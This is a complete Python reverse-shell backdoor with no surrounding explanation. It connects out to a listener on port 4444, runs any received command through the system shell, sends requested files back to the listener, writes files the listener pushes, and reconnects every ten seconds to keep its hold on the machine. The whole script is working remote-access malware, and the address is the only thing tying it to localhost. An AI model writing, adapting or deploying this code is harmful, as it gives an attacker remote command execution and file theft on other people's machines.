import socket
import subprocess
import os
import time

host = '127.0.0.1'
port = 4444

while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host, port))

        while True:
            command = client.recv(4096).decode()

            if command.lower() == "exit":
                client.close()
                break

            elif command.startswith("download "):
                filename = command[9:]
                try:
                    with open(filename, "rb") as f:
                        data = f.read(4096)
                        while data:
                            client.send(data)
                            data = f.read(4096)
                        time.sleep(1)
                        client.send(b"__DONE__")
                except FileNotFoundError:
                    client.send(b"__FILE_NOT_FOUND__")

            elif command.startswith("upload "):
                filename = command[7:]
                with open(filename, "wb") as f:
                    while True:
                        data = client.recv(4096)
                        if b"__DONE__" in data:
                            f.write(data.replace(b"__DONE__", b""))
                            break
                        f.write(data)

            elif command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    client.send(b"Directory changed.")
                except:
                    client.send(b"Failed to change directory.")

            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    output = e.output
                if not output:
                    output = b"[+] Command executed but no output."
                client.send(output)

    except Exception:
        print("Reconnecting in 10 seconds...")
        time.sleep(10)
